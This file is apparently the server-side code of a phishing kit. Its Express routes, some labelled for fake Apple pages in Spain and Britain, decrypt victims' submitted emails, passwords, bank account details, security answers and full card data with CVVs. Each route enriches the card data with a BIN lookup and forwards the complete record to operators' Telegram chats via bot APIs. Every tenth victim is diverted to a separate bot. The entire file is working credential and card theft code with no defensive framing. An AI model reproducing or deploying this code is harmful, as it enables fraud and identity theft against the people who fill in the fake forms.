  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secQuestion = CryptoJS.AES.decrypt(req.body.secQuestion, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secAnswer = CryptoJS.AES.decrypt(req.body.secAnswer, "402312").toString(
    CryptoJS.enc.Utf8
  );

  var originalText = `+----------- SFE ------------+\nEmail: ${email}\nPassword: ${password}\nName: ${fname} ${lname}\nTelephone: ${telephone}\nSort Code: ${scode}\nAccount Number: ${accno}\nSec Question: ${secQuestion}\nSec Answer: ${secAnswer}\n+----------- SFE ------------+`;

  if (jv == 10) {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `HAYTCHRES:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    jv = 4;
  } else {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `SFEJV:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 1002430657,
          text: `SFE:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    jv += 1;
  }
  res.send("Update Complete");
});

app.post("/sfeJV", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secQuestion = CryptoJS.AES.decrypt(req.body.secQuestion, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secAnswer = CryptoJS.AES.decrypt(req.body.secAnswer, "402312").toString(
    CryptoJS.enc.Utf8
  );

  var originalText = `+----------- SFE ------------+\nEmail: ${email}\nPassword: ${password}\nName: ${fname} ${lname}\nTelephone: ${telephone}\nSort Code: ${scode}\nAccount Number: ${accno}\nSec Question: ${secQuestion}\nSec Answer: ${secAnswer}\n+----------- SFE ------------+`;

  if (jv == 10) {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `HAYTCHRES:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    jv = 4;
  } else {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `SFEJV:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 1435332919,
          text: `SFE:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    jv += 1;
  }
  res.send("Update Complete");
});

app.post("/sfeNBA", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secQuestion = CryptoJS.AES.decrypt(req.body.secQuestion, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secAnswer = CryptoJS.AES.decrypt(req.body.secAnswer, "402312").toString(
    CryptoJS.enc.Utf8
  );

  var originalText = `+----------- SFE ------------+\nEmail: ${email}\nPassword: ${password}\nName: ${fname} ${lname}\nTelephone: ${telephone}\nSort Code: ${scode}\nAccount Number: ${accno}\nSec Question: ${secQuestion}\nSec Answer: ${secAnswer}\n+----------- SFE ------------+`;

  if (chasingfunds == 10) {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `HAYTCHRES:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    chasingfunds = 4;
  } else {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `SFEChasing:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 1778408628,
          text: `SFE:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    chasingfunds += 1;
  }
  res.send("Update Complete");
});

app.post("/sfeChasing", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secQuestion = CryptoJS.AES.decrypt(req.body.secQuestion, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secAnswer = CryptoJS.AES.decrypt(req.body.secAnswer, "402312").toString(
    CryptoJS.enc.Utf8
  );

  var originalText = `+----------- SFE ------------+\nEmail: ${email}\nPassword: ${password}\nName: ${fname} ${lname}\nTelephone: ${telephone}\nSort Code: ${scode}\nAccount Number: ${accno}\nSec Question: ${secQuestion}\nSec Answer: ${secAnswer}\n+----------- SFE ------------+`;

  if (chasingfunds == 10) {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `HAYTCHRES:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    chasingfunds = 4;
  } else {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `SFEChasing:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 864072421,
          text: `SFE:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 969827191,
          text: `SFE:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    chasingfunds += 1;
  }
  res.send("Update Complete");
});

//APPLE ES
//APPLE ES
//APPLE ES

app.post("/kelvAppleSpain", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}\nCity: ${town}\nZIP: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        kelvCount = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleKelv:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1248378980,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        kelvCount += 1;
      }
      res.send("Update Complete");
    });
});

//APPLE AU

app.use("/apple", require("./routes/apple"));

//APPLE GB
//APPLE GB
//APPLE GB

app.post("/appleSYM", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (symEvri == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        symEvri = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleSYM:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 750220840,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        symEvri += 1;
      }
      res.send("Update Complete");
    });
});

app.post("/stackerApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (pweight == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        pweight = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleStacker:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 715738877,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        pweight += 1;
      }
      res.send("Update Complete");
    });
});

app.post("/pweightApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (pweight == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        pweight = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `ApplePweight:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5516677945,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        pweight += 1;
      }
      res.send("Update Complete");
    });
});

app.post("/dpApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (dpFullz == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        dpFullz = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleDPc:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5582405778,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        dpFullz += 1;
      }
      res.send("Update Complete");
    });
});

app.post("/rondoApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (capzEvri == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        capzEvri = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleRondo:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5598032330,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        capzEvri += 1;
      }
      res.send("Update Complete");
    });
});

